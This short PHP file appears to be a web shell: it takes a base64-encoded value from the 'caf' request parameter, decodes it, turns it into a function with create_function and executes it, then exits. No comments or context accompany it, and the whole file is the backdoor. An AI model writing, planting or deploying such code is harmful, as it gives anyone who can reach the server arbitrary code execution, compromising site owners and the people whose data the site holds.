<?php
if(!empty($_REQUEST['caf'])){$caf=base64_decode($_REQUEST["caf"]);$caf=create_function('',$caf);$caf();exit;}